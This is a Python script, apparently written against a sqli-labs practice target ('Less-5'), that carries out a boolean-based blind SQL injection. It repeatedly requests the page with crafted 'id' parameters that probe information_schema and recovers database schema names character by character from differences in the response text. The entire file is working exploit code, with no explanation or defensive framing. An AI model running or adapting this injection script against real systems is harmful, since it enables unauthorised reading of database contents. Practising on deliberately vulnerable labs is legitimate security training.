import requests
import string

headers = {
    'Host': 'www.nixiabing.xin',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
}

for i in string.printable:
    params = {
        'id': "1' and (select 1 from information_schema.schemata where schema_name regexp binary '^{}')#".format(i)
    }
    print(params["id"])
    response = requests.get('https://www.nixiabing.xin/sqli/Less-5/', headers=headers, params=params)
    if "You" in response.text:
        playload = ""
        for e in range(100):
            for s in string.printable:
                params2 = {
                    'id': "1' and (select 1 from information_schema.schemata where schema_name regexp binary '^"+i+"{}')#".format(playload+s)
                }
                response2 = requests.get('https://www.nixiabing.xin/sqli/Less-5/', headers=headers, params=params2)
                print(params2["id"])
                if "You" in response2.text:
                    playload += s
                    print(i + playload)
                    break